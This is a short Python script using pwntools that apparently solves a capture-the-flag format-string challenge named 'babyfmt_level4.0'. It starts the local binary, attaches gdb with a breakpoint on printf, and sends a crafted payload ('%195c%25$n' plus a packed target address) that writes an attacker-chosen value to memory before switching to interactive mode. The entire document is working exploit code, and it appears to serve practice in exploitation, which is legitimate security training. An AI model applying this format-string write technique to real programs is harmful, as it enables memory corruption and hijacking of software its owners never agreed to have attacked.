from pwn import * 

binary = './babyfmt_level4.0'

p = process(binary)

s = '''
b * printf
'''



gdb.attach(p, s)
p.sendline("%195c%25$n-------\x70\x41\x40\x00\x00\x00\x00\x00")




p.interactive()





